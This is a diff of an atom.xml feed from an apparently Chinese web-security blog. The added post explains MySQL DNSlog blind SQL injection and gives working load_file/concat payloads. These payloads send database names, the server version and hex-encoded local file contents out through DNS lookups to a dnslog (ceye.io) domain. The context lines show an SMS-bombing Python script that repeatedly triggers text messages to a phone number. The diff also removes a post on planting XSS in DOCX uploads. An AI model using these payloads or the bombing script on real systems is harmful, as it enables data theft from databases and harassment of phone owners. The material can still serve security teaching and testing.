@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://www.vkxss.top/"/>
-  <updated>2019-10-17T07:32:00.814Z</updated>
+  <updated>2019-10-21T16:59:09.506Z</updated>
   <id>http://www.vkxss.top/</id>
   
   <author>
@@ -15,6 +15,37 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Mysql-Dnslog盲注</title>
+    <link href="http://www.vkxss.top/2019/10/21/Mysql-Dnslog%E7%9B%B2%E6%B3%A8/"/>
+    <id>http://www.vkxss.top/2019/10/21/Mysql-Dnslog盲注/</id>
+    <published>2019-10-21T06:25:40.000Z</published>
+    <updated>2019-10-21T16:59:09.506Z</updated>
+    
+    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#0x00-为什么用dnslog盲注">0x00 为什么用Dnslog盲注</a></li><li><a href="#0x01-利用条件">0x01 利用条件</a></li><li><a href="#0x02-如何查看mysql是否开启了文件导入导出">0x02 如何查看mysql是否开启了文件导入导出？</a></li><li><a href="#0x03-构造攻击payload">0x03 构造攻击Payload</a></li><li><a href="#0x04-reference">0X04 Reference</a></li></ul><!-- tocstop --><h2><span id="0x00-为什么用dnslog盲注">0x00 为什么用Dnslog盲注</span></h2><ul><li>对于SQL盲注，我们可以通过布尔或者时间盲注获取内容，但是整个过程效率低，需要发送很多的请求进行判断，容易触发安全设备的防护，Dnslog盲注可以减少发送的请求，直接回显数据实现注入。<br><img src="http://pic.c1imber.top/blog/180630/8aC6fb4hHB.png?imageslim" alt></li></ul><h2><span id="0x01-利用条件">0x01 利用条件</span></h2><ul><li><p>数据库的load_file函数必须可用，也就是数据库用户必须要有file_priv权限</p></li><li><p>其次就是mysql的secure_file_priv不为NULL,有些高版本的mysql中的secure_file_priv默认为NULL</p><ul><li>secure_file_priv特性secure_file_priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。</li></ul></li></ul><h2><span id="0x02-如何查看mysql是否开启了文件导入导出">0x02 如何查看mysql是否开启了文件导入导出？</span></h2><ul><li><p>在MySQL 5.5.53版本之前，这个变量默认为空，因此我们就可以使用这些函数。但是在该版本之后，NULL值会禁用这些函数。我们可使用其中的一种方法来检查这个变量的值。Secure_file_priv是一个全局变量且是一个只读变量，也就是说在运行时无法更改。</p></li><li><p>使用如下命令查看：</p><ul><li><p>mysql&gt;show global variables like ‘%secure%’;</p></li><li><p>secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出。</p><ul><li>当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下。</li><li>当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制。<br><img src="http://pic.c1imber.top/blog/180630/96ilB0fDlj.png?imageslim" alt></li></ul></li></ul></li></ul><ul><li><p>总结下如何修改secure_file_priv的值？</p><ul><li><p>windows下：修改my.ini 在[mysqld]内加入secure_file_priv =</p></li><li><p>linux下：修改my.cnf 在[mysqld]内加入secure_file_priv =</p></li><li><p>MYSQL新特性secure_file_priv对读写文件的影响</p></li><li><p>然后重启mysql，再查询secure_file_priv</p><p>  <img src="http://pic.c1imber.top/blog/180630/mKDHhh4j1G.png?imageslim" alt></p></li></ul></li></ul><h2><span id="0x03-构造攻击payload">0x03 构造攻击Payload</span></h2><ul><li><p>普通payload：</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0、select load_file(concat(&apos;\\\\&apos;,(select database()),&apos;.xxxx.ceye.io\\abc&apos;))</span><br><span class="line">1、concat是字符串拼接；</span><br><span class="line">2、用4个,因为\\会被转义为:\</span><br><span class="line">3、database()就是你要做SQL注入查询的地方</span><br><span class="line">4、&apos;.xxxx.ceye.io\abc&apos;就是你的dnslog平台给你的域名</span><br><span class="line">5、unc路径 网络共享文件方式 \\dnslog\abc这样的路径</span><br></pre></td></tr></table></figure></li></ul><pre><code>- 上面拼接的结果就是&quot;\\\\ schema_name.dnslog\\abc&quot;，其实相当于访问了带有数据库名称的三级域名，被dnslog捕获到了。</code></pre><ul><li><p>加密payload</p><ul><li><p>利用bur or select hex(“要加密的数据”)即可.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">加密前：</span><br><span class="line">    select load_file(concat(&quot;\\\\&quot;,version(),&quot;.dnslog\\abc&quot;));</span><br><span class="line">16进制加密后：</span><br><span class="line">    select load_file(concat(0x5c5c5c5c,version(),0x6xxf62312e7xxb2e307xx36363xx63635c5c616263));</span><br></pre></td></tr></table></figure><p><a href="https://imgchr.com/i/K1Xd56" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/22/K1Xd56.png" alt="K1Xd56.png"></a></p><p><a href="https://imgchr.com/i/K1XaUx" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/22/K1XaUx.png" alt="K1XaUx.png"></a></p></li></ul></li><li><p>读配置文件payload</p><ul><li><p>这里构造下payload读取：c:\phpStudy\WWW\phpinfo.php</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">首先</span><br><span class="line">select hex(&apos;C:\\phpStudy\\WWW\\phpinfo.php&apos;)</span><br><span class="line">得到加密字符串:433A5C70687053747564795C5757575C706870696E666F2E706870</span><br><span class="line"></span><br><span class="line">然后构造下payload:</span><br><span class="line">select load_file(concat(0x5c5c5c5c,(select load_file(0x433A5C70687053747564795C5757575C706870696E666F2E706870)),0x6f6xxxxxx6b2e307xx363xxxxxc5c616263)); //这里用了两个load_file就解决上面所说的问题了。</span><br><span class="line"></span><br><span class="line">但是你觉得会成功吗 no no no</span><br><span class="line"></span><br><span class="line">因为文件带有换行符这是不符合 域名规范的 那么我们怎么办呢 加密数据咯</span><br><span class="line">用hex() 继续构造payload:</span><br><span class="line">select load_file(concat(0x5c5c5c5c,hex((select load_file(0x433A5C70687053747564795C5757575C706870696E666F2E706870))),0x6f6f62xxxx66b2xxx78636xxxx5c5c616263));</span><br></pre></td></tr></table></figure></li><li><p>复现如下图：</p><p>  <a href="https://imgchr.com/i/K1jCL9" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/22/K1jCL9.png" alt="K1jCL9.png"></a><br>  <a href="https://imgchr.com/i/K1jpM4" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/22/K1jpM4.png" alt="K1jpM4.png"></a><br>  <a href="https://imgchr.com/i/K1j9sJ" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/22/K1j9sJ.png" alt="K1j9sJ.png"></a></p></li></ul></li></ul><h2><span id="0x04-reference">0X04 Reference</span></h2><pre><code>- 参考链接：    https://xz.aliyun.com/t/3992#toc-1    https://www.freebuf.com/articles/web/201013.html    https://www.t00ls.net/thread-44273-1-1.html</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;!-- toc --&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;#0x00-为什么用dnslog盲注&quot;&gt;0x00 为什么用Dnslog盲注&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#0x01-利用条件&quot;&gt;0x01 利用条件&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#0x0
+      
+    
+    </summary>
+    
+    
+      <category term="WEB安全" scheme="http://www.vkxss.top/categories/WEB%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="WEB渗透测试" scheme="http://www.vkxss.top/tags/WEB%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+  </entry>
   
   <entry>
     <title>nostromo nhttpd 路径遍历漏洞</title>
@@ -565,7 +596,7 @@
     <link href="http://www.vkxss.top/2018/10/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%9F%AD%E4%BF%A1%E8%BD%B0%E7%82%B8%E8%84%9A%E6%9C%AC/"/>
     <id>http://www.vkxss.top/2018/10/12/渗透测试-短信轰炸脚本/</id>
     <published>2018-10-12T04:25:40.000Z</published>
-    <updated>2019-10-19T14:56:25.833Z</updated>
+    <updated>2019-10-20T14:53:54.443Z</updated>
     
     <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#一分钟短信轰炸脚本">一分钟短信轰炸脚本</a></li></ul><!-- tocstop --><h2><span id="一分钟短信轰炸脚本">一分钟短信轰炸脚本</span></h2><ul><li>当前后端校验60秒倒计时时，使用该脚本进行短信轰炸</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line"># python 3.6.0</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import random</span><br><span class="line">import time </span><br><span class="line">import json</span><br><span class="line">headers=&#123;</span><br><span class="line">&quot;Host&quot;: &quot;qq.com&quot;,</span><br><span class="line">&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0&quot;,</span><br><span class="line">&quot;Accept&quot;: &quot;application/json, text/plain, */*&quot;,</span><br><span class="line">&quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;,</span><br><span class="line">&quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,</span><br><span class="line">&quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;,</span><br><span class="line">&quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;,</span><br><span class="line">&quot;Referer&quot;: &quot;https://qq.com/mng/&quot;,</span><br><span class="line">&quot;Cookie&quot;: &quot;XXX&quot;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">def Send():</span><br><span class="line">try:</span><br><span class="line">url = &quot;https://qq.com/&quot;</span><br><span class="line">data = &#123;&quot;phone&quot;:&quot;number&quot;,&quot;_qq_csrf&quot;:&quot;5d184ad253da6af72fec3106bfe3e8f79fa5a502&quot;&#125;</span><br><span class="line"># data为json数据</span><br><span class="line"># res = requests.post(url=url,headers=headers,data=json.dumps(data))</span><br><span class="line">res = requests.post(url=url,headers=headers,data=data)</span><br><span class="line">print (&apos;Phone:number&apos;  + &apos;ReturnValue:&#123;&#125;&apos;.format(res.text))</span><br><span class="line">except Exception as e: </span><br><span class="line">print(e)</span><br><span class="line"></span><br><span class="line">if __name__==&quot;__main__&quot;:</span><br><span class="line"> for i in range(30):</span><br><span class="line">time.sleep(65)</span><br><span class="line">Send()</span><br></pre></td></tr></table></figure>]]></content>
     
@@ -588,36 +619,6 @@
     
     
       <category term="python" scheme="http://www.vkxss.top/categories/python/"/>
-    
-    
-      <category term="WEB渗透测试" scheme="http://www.vkxss.top/tags/WEB%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>DOCX文件弹出XSS</title>
-    <link href="http://www.vkxss.top/2018/07/28/DOCX%E6%96%87%E4%BB%B6%E5%BC%B9%E5%87%BAXSS/"/>
-    <id>http://www.vkxss.top/2018/07/28/DOCX文件弹出XSS/</id>
-    <published>2018-07-28T07:30:08.000Z</published>
-    <updated>2019-09-22T17:11:51.250Z</updated>
-    
-    <content type="html"><![CDATA[<ul><li><p><font face="微软雅黑">背景：</font></p><ul><li><ul><li><p><font face="微软雅黑">如何使用Microsoft Word文档（docx格式）将跨站点脚本（XSS）漏洞上传到Web服务器</font></p><ul><li><font face="微软雅黑">支持在线读取word文档</font></li><li><font face="微软雅黑">或者允许上传html文件，浏览器并成功解析(Content-Type为text/html)</font></li></ul></li></ul></li></ul></li></ul><ul><li><p><font face="微软雅黑">构造XSS弹框word</font></p><ul><li><p><font face="微软雅黑">方式一：</font></p><ul><li><p><font face="微软雅黑">Microsoft Word文档的核心是一个包含XML和Word文件;</font></p></li><li><p><font face="微软雅黑">我们可以通过运行Linux命令strings file-sample.docx来查看文件中所有的ASCII字符，以查看可用的字符串;</font></p></li><li><p><font face="微软雅黑">将文件解压缩，方便我们在不损坏文件的情况下，修改它；</font></p></li><li><p><font face="微软雅黑">例如修改settings.xml为aaaaaaaaa.xml;</font></p></li><li><p><font face="微软雅黑">然后输入zip -r 重新打包，生成新文件;</font></p></li><li><p><font face="微软雅黑">利用ultraedit文本编辑器查看十六进制代码块找到A的字符串,并修改为js代码;</font></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># strings file-sample.docx</span><br><span class="line"># unzip file-sample.docx</span><br><span class="line"># cd word</span><br><span class="line"># mv settings.xml aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.xml</span><br><span class="line"># zip -r test.docx *</span><br></pre></td></tr></table></figure></li></ul></li><li><p><font face="微软雅黑">方式二：</font></p><ul><li><font face="微软雅黑">直接利用ultraedit文本编辑器找到word文档空白位置,在不破坏文档的情况下，修改为JS代码保存即可;<br>  <font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/He107e7f9d9c946c1bdb76d36c1d501a3S.jpg" style="zoom:40%"></center><br>  <font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/H15a4f3bcfa7d49f9992a6a478e3b9acbt.jpg" style="zoom:40%"></center></font></font></font></li></ul></li></ul></li></ul><ul><li><p><font face="微软雅黑">防护措施</font></p><ul><li><font face="微软雅黑">这样的效果对于开发者来说应该采取以下手段来进行限制。</font></li><li><font face="微软雅黑">文件上传之前，在服务器端验证上传文件格式是否为.doc或.docx有效格式；</font></li><li><font face="微软雅黑">严格限制Content-Type头，对Content-Type头或特定后缀格式更改过的上传文件须保持与上传文件相同的Content-Type头信息；</font></li><li><font face="微软雅黑">控制文件下载时的其它操作情况，添加响应标头:“Content-Disposition: attachment”，以防止在浏览器中内嵌显示文件；</font></li><li><font face="微软雅黑">过滤掉所有包含HTML标签的上传，因为docx可经压缩篡改其中包含的HTML文件。</font></li></ul></li></ul>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;ul&gt;
-&lt;li&gt;&lt;p&gt;&lt;font face=&quot;微软雅黑&quot;&gt;背景：&lt;/font&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;ul&gt;
-&lt;li&gt;&lt;p&gt;&lt;font face=&quot;微软雅黑&quot;&gt;如何使用Microsoft Word文档（docx格式）将跨站点脚本（XSS）漏洞上传到Web服务器&lt;/font
-      
-    
-    </summary>
-    
-    
-      <category term="WEB安全" scheme="http://www.vkxss.top/categories/WEB%E5%AE%89%E5%85%A8/"/>
     
     
       <category term="WEB渗透测试" scheme="http://www.vkxss.top/tags/WEB%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
